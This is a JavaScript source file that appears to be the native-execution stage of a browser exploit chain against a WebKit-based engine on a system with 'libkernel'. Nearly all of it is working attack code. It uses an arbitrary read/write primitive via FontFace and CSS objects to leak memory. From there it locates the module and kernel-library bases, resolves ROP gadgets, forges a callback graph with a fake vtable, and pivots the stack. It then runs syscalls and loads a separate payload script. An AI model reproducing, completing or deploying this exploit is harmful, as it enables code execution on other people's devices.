//#region map
const STAGE_SIZE = 0x20000;
const STAGE_K = 0x300;
const STAGE_MARK = 0x280;
const STAGE_MARK_STRIDE = 0x20;
const CAPTURE_MARK = STAGE_MARK + 2 * STAGE_MARK_STRIDE;
const STAGE_NONCE = 0x2d0;
const STAGE_READ_TEST = 0x8000;
const READ_CHUNK_SIZE = 0x100;
const RESULT_OFF = 0xc000;
//#endregion

//#region state
let arw_handoff = null;

let read_chunk_size = 16;

let stage_raw = null;
let stage_view = null;
let stage_face = null;
let stage_set = null;
let target_added = false;
let stage_added = false;
let graph_snapshot = null;
let native_context = null;
//#endregion

//#region fixture
const STAGE_SIGNATURE = [0x53353450, 0x31454754, 0x4b52414d, 0x21524552];

const STAGE_FONT_B64 =
  'AAEAAAAOAIAAAwBgR0RFRgARAAIAAATYAAAAFkdQT1NEdkx1AAAE8AAAACBHU1VCkxWCFgAABRAAAAA2T1MvMnroW/AAAAJgAAAAYGNtYXAADACVAAACwAAAADRnYXNwABgACQAABMgAAAAQZ2x5ZszZhHcAAADsAAAA5GhlYWT0p6kkAAAB+AAAADZoaGVhDksGBQAAAjwAAAAkaG10eAjqAEgAAAIwAAAACmxvY2EAKQByAAAB8AAAAAhtYXhwAGAB4QAAAdAAAAAgbmFtZSNtOqgAAAL0AAABsnBvc3T/wACWAAAEqAAAACAAAgAEAAAFUgWBAAcAFAAAIQMhAyMBMwkBLgMnDgMHAyEEj6H9fqLGAj/ZAjb9rhAdFg8BAg4XHQ+0Ag8BnP5kBYH6fwQCKFJDLQUFLkRSKP4xAAMAqAAABOoFgQAWACEALgAAARQOAiMhESEyHgIVFA4CBx4DATQmIyERITI+AhM0LgIjIREhMj4CBOpUjrxo/cQCAHW4gEMhQ2VDVYNYLv7unJT+vwFBVHRIIFExXIFQ/pwBc0l7WTIBjWuXXywFgSdUgVo7aFU9Dwo6WncCQnJi/kIhPVb9vkNePBz+BBg8ZAAAAQAAAAMBUgBUAIwABQABAAAAAAAAAAAAAAAAAAMAAgAAAAAAKQByAAEAAAABEevKH+a6Xw889QAfCAAAAAAAvxr/gAAAAADPkk3h/mD9kwhnB0gAAAAIAAIAAAAAAAAC7ABEBVYABACoAAAAAQAABz7+TgBDCMD+YP70CGcAAQAAAAAAAAAAAAAAAAAAAAIAAwS4AZAABQAABZoFMwAAARsFmgUzAAAD0QBmAhIIBQILBgQCAgICAgQAAAABAAAAAAAAAAAAAAAAMUFTQwBAAEEAQgXT/lEBMwc+AbIAAAABAAAAAAQ6BYEAAAAgAAIAAAACAAAAAwAAABQAAwABAAAAFAAEACAAAAAEAAQAAQAAAEL//wAAAEH////AAAEAAAAAAAAABwBaAAMAAQQJAAAAwAAAAAMAAQQJAAEAHgDAAAMAAQQJAAIADgDeAAMAAQQJAAMANADsAAMAAQQJAAQAHgDAAAMAAQQJAAUAHAEgAAMAAQQJAAYAHAE8AEMAbwBwAHkAcgBpAGcAaAB0ACAAKABjACkAIAAyADAAMAA3ACAAUgBlAGQAIABIAGEAdAAsACAASQBuAGMALgAgAEEAbABsACAAcgBpAGcAaAB0AHMAIAByAGUAcwBlAHIAdgBlAGQALgAgAEwASQBCAEUAUgBBAFQASQBPAE4AIABpAHMAIABhACAAdAByAGEAZABlAG0AYQByAGsAIABvAGYAIABSAGUAZAAgAEgAYQB0ACwAIABJAG4AYwAuAEwAaQBiAGUAcgBhAHQAaQBvAG4AIABTAGEAbgBzAFIAZQBnAHUAbABhAHIAQQBzAGMAZQBuAGQAZQByACAALQAgAEwAaQBiAGUAcgBhAHQAaQBvAG4AIABTAGEAbgBzAFYAZQByAHMAaQBvAG4AIAAxAC4AMAA3AC4ANABMAGkAYgBlAHIAYQB0AGkAbwBuAFMAYQBuAHMAAAADAAAAAAAA/70AlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAIAAIAEQAB//8AAwABAAAADAAAAAAAAAABAAEAAgABAAEAAAABAAAACgAcAB4AAURGTFQACAAEAAAAAP//AAAAAAAAAAEAAAAKADIANAAEREZMVAAaY3lybAAkZ3JlawAkbGF0bgAkAAQAAAAA//8AAAAAAAAAAAAAAAA=';
//#endregion

//#region view
function read_memory(address, length, label) {
  if (!arw_handoff) throw new Error('ARW handoff is not ready');

  const addr = to_number(address);
  const size = to_number(length);
  if (addr <= 0) throw new RangeError('invalid read address');
  if (size <= 0 || size > 0x10000) throw new RangeError('invalid read length: ' + length);

  const snapshot = snapshot_carrier();
  let decoded = null;
  try {
    pack_read_graph(arw_handoff.backing, addr, size);
    const before = snapshot_carrier();
    decoded = decode_css_string(String(target.display));
    const after = snapshot_carrier();
    if (!decoded || decoded.length !== size) throw new Error(label + '_DECODE_' + (decoded ? decoded.length : -1));
    if (!only_packed_v_cached_bit_changed(before, after)) throw new Error(label + '_CACHE_TRANSITION');
  } finally {
    restore_carrier(snapshot);
  }
  if (!carrier_matches(snapshot)) throw new Error(label + '_RESTORE');
  return decoded;
}

function read_pointer(address, label) {
  return read_qword(read_memory(address, 8, label), 0);
}

function stage_write32(view, offset, value) {
  view.setUint32(offset, value >>> 0, true);
}

function stage_write64(view, offset, value) {
  const packed = BigInt.asUintN(64, to_bigint(value));
  stage_write32(view, offset, Number(packed & 0xffffffffn));
  stage_write32(view, offset + 4, Number(packed >> 32n));
}
//#endregion

//#region graph
function pack_callback_graph(base, property_pointer, module, callable) {
  for (let i = 0; i < 192; ++i) {
    winner_view[i] = 0;
  }
  const client = base + 0x18;
  const outer_bucket = base + 0x3c;
  const wrapper = base + 0x80;
  const observer_bucket = base + 0xa8;
  const observer_impl = base + 0xb0;
  put32(winner_view, 0, 0x100);
  put64(winner_view, 8, property_pointer);
  put64(winner_view, 16, 0);
  put64(winner_view, 0x18, module + impl.wk_fake_client_vtable);
  put64(winner_view, 0x28, 0x100);
  put32(winner_view, 0x30, 1);
  put32(winner_view, 0x34, 0);
  put32(winner_view, 0x38, 1);
  put64(winner_view, 0x3c, wrapper);
  put64(winner_view, 0x50, 0);
  put64(winner_view, 0x58, outer_bucket);
  put32(winner_view, 0x60, 0);
  put32(winner_view, 0x64, 512);
  put64(winner_view, 0x70, observer_bucket);
  put32(winner_view, 0x78, 0);
  put32(winner_view, 0x7c, 512);
  put64(winner_view, 0x80, 0x100);
  put64(winner_view, 0x88, client);
  put32(winner_view, 0x98, 0);
  put32(winner_view, 0x9c, 1);
  put32(winner_view, 0xa0, 0);
  put32(winner_view, 0xa4, 1);
  put64(winner_view, 0xa8, observer_impl);
  put64(winner_view, 0xb0, callable - 1);
  put64(winner_view, 0xb8, observer_bucket);
}
//#endregion

//#region locate
function locate_stage(module, consumer_table, target_backing) {
  const header = read_memory(consumer_table - 16, 16, 'CLIENT_TABLE_HEADER');
  const key_count = read_uint32(header, 4);
  const table_size = read_uint32(header, 12);
  if (key_count < 1 || key_count > 8 || table_size < 2 || table_size > 64 || table_size & (table_size - 1)) throw new Error('CLIENT_TABLE_META');

  const buckets = read_memory(consumer_table, table_size * 8, 'CLIENT_TABLE_BUCKETS');
  let set_object = 0;
  let stage_face_native = 0;
  let candidate_vptr = 0;

  for (let i = 0; i < table_size && !set_object; ++i) {
    const bucket_impl = read_qword(buckets, i * 8);
    if (!is_heap_pointer(bucket_impl)) continue;

    const candidate = read_pointer(bucket_impl + 8, 'CLIENT_SET_PTR');
    if (!is_heap_pointer(candidate)) continue;

    candidate_vptr = read_pointer(candidate, 'CLIENT_SET_VPTR');
    if (candidate_vptr < module || candidate_vptr >= module + 0x4000000) continue;

    const vector = read_memory(candidate + 0x18, 16, 'CLIENT_SET_FACES_VECTOR');
    const faces_buffer = read_qword(vector, 0);
    const capacity = read_uint32(vector, 8);
    const size = read_uint32(vector, 12);
    if (!is_heap_pointer(faces_buffer) || capacity < 2 || size !== 2) continue;

    const pair = read_memory(faces_buffer, 16, 'CLIENT_SET_FACE_PAIR');
    const first = read_qword(pair, 0);
    const second = read_qword(pair, 8);
    if (is_heap_pointer(first) && second === target_backing) {
      set_object = candidate;
      stage_face_native = first;
    }
  }

  if (!set_object) throw new Error('SET_CLIENT_NOT_FOUND');

  const sources_vector = read_memory(stage_face_native + 0x48, 16, 'STAGE_SOURCES_VECTOR');
  const sources = read_qword(sources_vector, 0);
  const sources_size = read_uint32(sources_vector, 12);
  if (!is_heap_pointer(sources) || sources_size < 1) throw new Error('STAGE_SOURCES');

  const source = read_pointer(sources, 'STAGE_SOURCE0');
  if (!is_heap_pointer(source)) throw new Error('STAGE_SOURCE0_SHAPE');

  const native_view = read_pointer(source + 0x30, 'STAGE_VIEW');
  if (!is_heap_pointer(native_view)) throw new Error('STAGE_VIEW_SHAPE');

  const view_meta = read_memory(native_view + 0x10, 16, 'STAGE_VIEW_META');
  const byte_length = read_qword(view_meta, 0);
  const stage_backing = read_qword(view_meta, 8);
  if (byte_length !== stage_raw.byteLength || !is_heap_pointer(stage_backing)) throw new Error('STAGE_VIEW_META_SHAPE');

  const signature = read_memory(stage_backing + 0x300, 16, 'STAGE_SIGNATURE');
  const expected = stage_raw.slice(0x300, 0x310);
  if (!bytes_equal(signature, expected)) throw new Error('STAGE_SIGNATURE_MISMATCH');

  return { set_object, face: stage_face_native, backing: stage_backing };
}
//#endregion

//#region kernel
function read_client_module() {
  const client_bytes = read_memory(arw_handoff.weak_face, 32, 'FONTFACE_CLIENT32');
  const client_address_point = read_qword(client_bytes, 0);
  const read_backing = read_qword(client_bytes, 16);
  const read_promise = read_qword(client_bytes, 24);
  const module = client_address_point - impl.wk_client_ap;
  if (!is_module_base(module) || read_backing !== arw_handoff.backing || read_promise !== arw_handoff.loaded_promise)
    throw new Error('FONTFACE_CLIENT_SHAPE');
  return module;
}

function resolve_kernel(module) {
  const in_module = (value) => value >= module && value < module + 0x4000000;
  const in_lib = (value) => value >= 0x800000000 && value < 0x900000000;

  const read_lib_pointer = (offset, label) => {
    let value = 0;
    for (let attempt = 0; attempt < 3; attempt++) {
      value = read_qword(read_memory(module + offset, 8, label), 0);
      if (in_lib(value)) return value;
    }
    return value;
  };

  const errno_ptr = read_lib_pointer(impl.wk_errno_got, 'ERRNO_GOT');
  if (!in_lib(errno_ptr) || errno_ptr % 16 || in_module(errno_ptr)) throw new Error('ERRNO_GOT');
  const libkernel_base = errno_ptr - impl.lk_errno;
  if (libkernel_base & 0xfff || !in_lib(libkernel_base)) throw new Error('LK_BASE');

  const strerror_ptr = read_lib_pointer(impl.wk_strerror_got, 'STRERROR_GOT');
  if (!in_lib(strerror_ptr) || in_module(strerror_ptr)) throw new Error('STRERROR_GOT');

  const gadget = (rva) => {
    const address = module + rva;
    if (address <= module || address >= module + 0x4000000) throw new Error('GADGET_RANGE');
    return address;
  };
  const capture_target = gadget(impl.wk_capture);
  const ret_gadget = gadget(impl.wk_ret);
  const ap = module + impl.wk_function_ap;
  const slot2 = module + impl.wk_function_slot2;
  const vs = read_memory(ap, 24, 'ROUNDTRIP_VTABLE24');
  const v0 = read_qword(vs, 0);
  const v1 = read_qword(vs, 8);
  const v2 = read_qword(vs, 16);
  const exact = in_module(v0) && in_module(v1) && v2 === slot2;
  beacon(
    'ROUNDTRIP_GATE',
    `ap=0x${hex64(ap)}|slot2=0x${hex64(v2)}|capture=0x${hex64(capture_target)}|pivot=0x${hex64(module + impl.wk_pivot)}|exact=${exact ? 1 : 0}`,
  );
  if (!exact) throw new Error('RETAIL_ROUNDTRIP_SHAPE');
  return {
    syscall_wrapper: libkernel_base + impl.lk_close + 7,
    notify_fn: libkernel_base + impl.lk_notify,
    errno_fn: libkernel_base + impl.lk_errno,
    libc_strerror: strerror_ptr,
    capture_target,
    ret: ret_gadget,
    ap,
    pivot_target: gadget(impl.wk_pivot),
    pop_rax: gadget(impl.wk_pop_rax_ret),
    pop_rdi: gadget(impl.wk_pop_rdi_ret),
    pop_rsi: gadget(impl.wk_pop_rsi_ret),
    pop_rdx: gadget(impl.wk_pop_rdx_ret),
    pop_rcx: gadget(impl.wk_pop_rcx_ret),
    pop_r8: gadget(impl.wk_pop_r8_ret),
    pop_r9: gadget(impl.wk_pop_r9_ret),
    store_rax: gadget(impl.wk_store_rax_ret),
    pop_rsp: gadget(impl.wk_pop_rsp_ret),
  };
}
//#endregion

//#region pivot
function assert_handoff(handoff) {
  if (!handoff || typeof handoff !== 'object') throw new TypeError('invalid ARW handoff');

  const fields = ['backing', 'weak_face', 'loaded_promise', 'packed_properties', 'family_name', 'properties_context'];
  for (const field of fields) {
    if (handoff[field] === undefined || handoff[field] === null) throw new TypeError('missing ARW handoff field: ' + field);
  }
  if (!Number.isSafeInteger(handoff.backing) || handoff.backing <= 0) throw new TypeError('invalid stage backing');
}

function disarm_stage() {
  if (!stage_view || !native_context) return;
  stage_write64(stage_view, STAGE_K + 8, 0);
  stage_write64(stage_view, STAGE_K + 16, native_context.targets.ret);
}

async function boot_native_stage(handoff) {
  assert_handoff(handoff);
  arw_handoff = handoff;
  native_context = null;
  heap_top = HEAP_OFFSET;
  adjust_toggle = 0;
  stage_raw = null;
  stage_view = null;
  stage_face = null;
  stage_set = font_sets[1];
  target_added = false;
  stage_added = false;
  graph_snapshot = null;

  try {
    await load_script(`src/poc/payload.js?v=${Date.now()}`);

    const module = read_client_module();

    beacon(
      'READER',
      `client=0x${hex64(arw_handoff.weak_face)}|backing=0x${hex64(arw_handoff.backing)}|module=0x${hex64(module)}|targets=1|restored=1|xomSkipped=1`,
    );

    const font_binary = atob(STAGE_FONT_B64);
    if (font_binary.length === 0 || font_binary.length > STAGE_SIZE) throw new Error('STAGE_FIXTURE_LENGTH_' + font_binary.length);
    stage_raw = new Uint8Array(STAGE_SIZE);
    for (let i = 0; i < font_binary.length; ++i) {
      stage_raw[i] = font_binary.charCodeAt(i) & 255;
    }
    if (stage_raw[0] !== 0 || stage_raw[1] !== 1 || stage_raw[2] !== 0 || stage_raw[3] !== 0) throw new Error('STAGE_FIXTURE');
    stage_view = new DataView(stage_raw.buffer);
    for (let sig_index = 0; sig_index < STAGE_SIGNATURE.length; sig_index++) {
      stage_write32(stage_view, STAGE_K + sig_index * 4, STAGE_SIGNATURE[sig_index]);
    }
    const nonce = ((((Date.now() ^ Math.floor(Math.random() * 0x7fffffff)) >>> 0) | 1) >>> 0);
    stage_write32(stage_view, STAGE_NONCE, nonce);
    stage_face = new FontFace('p1245_stage', stage_raw.buffer, { style: 'normal', weight: '400' });
    stage_set.add(stage_face);
    stage_added = stage_set.has(stage_face) === true;
    if (!stage_added) throw new Error('STAGE_SET_ADD');

    arw_handoff.properties_context.setLineDash(FAKE_PROPERTIES);
    configure_map_face(arw_handoff.packed_properties);
    target.family = arw_handoff.family_name;
    if (String(target.family) !== arw_handoff.family_name) throw new Error('STAGE_TARGET_FAMILY');
    stage_set.add(target);
    target_added = stage_set.has(target) === true;
    if (!target_added) throw new Error('STAGE_TARGET_ADD');
    const consumer_table = read_qword(winner_view, TABLE_OFFSET);
    const consumer_op = read_uint32(winner_view, OP_COUNT_OFFSET);
    const consumer_max = read_uint32(winner_view, MAX_OP_OFFSET);
    if (!is_heap_pointer(consumer_table) || consumer_op !== 1 || consumer_max !== 512) throw new Error('STAGE_CONSUMER_META');
    const stage = locate_stage(module, consumer_table, arw_handoff.backing);
    beacon(
      'STAGE_LOCATED',
      `table=0x${hex64(consumer_table)}|op=${consumer_op}|max=${consumer_max}|set=0x${hex64(stage.set_object)}|face=0x${hex64(stage.face)}|backing=0x${hex64(stage.backing)}|signature=1`,
    );

    const seen = read_uint32(read_memory(stage.backing + STAGE_NONCE, 4, 'STAGE_ALIAS'), 0);
    if (seen !== nonce) throw new Error('STAGE_ALIAS');

    const pattern = new Uint8Array(READ_CHUNK_SIZE);
    for (let i = 0; i < pattern.length; i++) {
      pattern[i] = (i * 7 + 3) & 0xff || 0xff;
      stage_view.setUint8(STAGE_READ_TEST + i, pattern[i]);
    }
    try {
      const chunk = read_memory(stage.backing + STAGE_READ_TEST, READ_CHUNK_SIZE, 'READ_CHUNK');
      let ok = chunk.length === READ_CHUNK_SIZE;
      for (let i = 0; ok && i < pattern.length; i++) {
        if (chunk[i] !== pattern[i]) ok = false;
      }
      read_chunk_size = ok ? READ_CHUNK_SIZE : 16;
    } catch (ignore_chunk) {
      read_chunk_size = 16;
    }

    const targets = resolve_kernel(module);
    const capture_target = targets.capture_target;

    if (stage_set.delete(target) !== true || stage_set.has(target) === true) throw new Error('STAGE_TARGET_DETACH');
    target_added = false;
    graph_snapshot = snapshot_carrier();
    const callable = stage.backing + STAGE_K;
    native_context = { module, stage, targets, callable };
    let c0 = 0;
    let c1 = 0;
    let poc_calls = 0;
    for (let pass = 0; pass < 3; ++pass) {
      pack_callback_graph(arw_handoff.backing, arw_handoff.packed_properties, module, callable);
      stage_write64(stage_view, STAGE_K, targets.ap);
      if (pass < 2) {
        const mark = STAGE_MARK + pass * STAGE_MARK_STRIDE;
        stage_write64(stage_view, mark, 0xffffffffffffffffn);
        stage_write64(stage_view, STAGE_K + 8, stage.backing + mark);
        stage_write64(stage_view, STAGE_K + 16, capture_target);
      } else {
        const l0 = stage_view.getUint32(STAGE_MARK, true);
        const h0 = stage_view.getUint32(STAGE_MARK + 4, true);
        const l1 = stage_view.getUint32(STAGE_MARK + STAGE_MARK_STRIDE, true);
        const h1 = stage_view.getUint32(STAGE_MARK + STAGE_MARK_STRIDE + 4, true);
        c0 = l0 + h0 * 4294967296;
        c1 = l1 + h1 * 4294967296;
        if (!h0 || h0 >= 0x80000000 || l0 & 7 || !h1 || h1 >= 0x80000000 || l1 & 7 || c0 !== c1)
          throw new Error('STACK_UNSTABLE_PRE_PIVOT_' + (c1 - c0));
        if (c1 >= stage.backing && c1 < stage.backing + STAGE_SIZE) throw new Error('STACK_CAPTURE_INVALID');
        const calls = [{ rax: SYSCALL.getpid, address: targets.syscall_wrapper, args: [] }];
        try {
          const plan = typeof poc_run === 'function' ? poc_run() : null;
          if (plan !== null && plan !== undefined) {
            if (!Array.isArray(plan)) throw new Error('POC_PLAN');
            for (const call of plan) {
              if (!call || !Number.isSafeInteger(call.address) || !Array.isArray(call.args)) throw new Error('POC_CALL');
              calls.push(call);
            }
          }
        } catch (poc_error) {
          beacon('POC_ERR', String((poc_error && poc_error.message) || poc_error).slice(0, 100));
        }
        poc_calls = calls.length;
        for (let index = 0; index < calls.length; index++) seed_result(RESULT_OFF + index * 8);
        build_call_sequence(stage, targets, calls, c1, RESULT_OFF);
      }
      beacon(
        'PC_PRE',
        `pass=${pass}|mode=${pass < 2 ? 'capture' : 'pivot'}|target=0x${hex64(pass < 2 ? capture_target : targets.pivot_target)}|stage=0x${hex64(stage.backing)}`,
      );
      target.sizeAdjust = next_size_adjust();
      beacon('SETTER_RETURN', 'pass=' + pass + '|returned=1');
      restore_carrier(graph_snapshot);
      if (!carrier_matches(graph_snapshot)) throw new Error('PASS_' + pass + '_CARRIER_RESTORE');
    }
    const pivot_result_lo = stage_view.getUint32(RESULT_OFF, true);
    const pivot_result_hi = stage_view.getUint32(RESULT_OFF + 4, true);
    beacon('PIVOT_POST', 'pivot=0x' + hex64(c1) + '|result=0x' + hex32(pivot_result_lo) + hex32(pivot_result_hi) + '|delta=' + (c1 - c0));
    if (result_is_seeded(RESULT_OFF)) throw new Error('PIVOT_NOT_EXECUTED');
    if (pivot_result_lo === 0 && pivot_result_hi === 0) throw new Error('PIVOT_RAX');

    if (poc_calls > 1) {
      const poc_lo = stage_view.getUint32(RESULT_OFF + 8, true);
      const poc_hi = stage_view.getUint32(RESULT_OFF + 12, true);
      const executed = !(poc_lo === CHAIN_SENTINEL_LO && poc_hi === CHAIN_SENTINEL_HI);
      beacon('POC', executed ? 'ret=0x' + hex32(poc_hi) + hex32(poc_lo) : 'not executed');
      flush_beacons();
    }

    graph_snapshot = null;
    arw_handoff.properties_context.setLineDash(DASH);
    if (stage_set.delete(stage_face) !== true || stage_set.has(stage_face) === true) throw new Error('STAGE_FACE_DETACH');
    stage_added = false;

    verdict(String(pivot_result_lo + pivot_result_hi * 4294967296), 'pass');
  } catch (error) {
    try {
      disarm_stage();
    } catch (ignore_disarm) {}
    if (graph_snapshot) {
      try {
        restore_carrier(graph_snapshot);
      } catch (ignore_restore) {}
    }
    try {
      arw_handoff.properties_context.setLineDash(DASH);
    } catch (ignore_dash) {}
    if (target_added) {
      try {
        stage_set.delete(target);
      } catch (ignore_target) {}
    }
    if (stage_added) {
      try {
        stage_set.delete(stage_face);
      } catch (ignore_stage) {}
    }
    verdict('STAGE_STOP|' + String((error && error.message) || error).slice(0, 160), 'fail');
  }
}
//#endregion
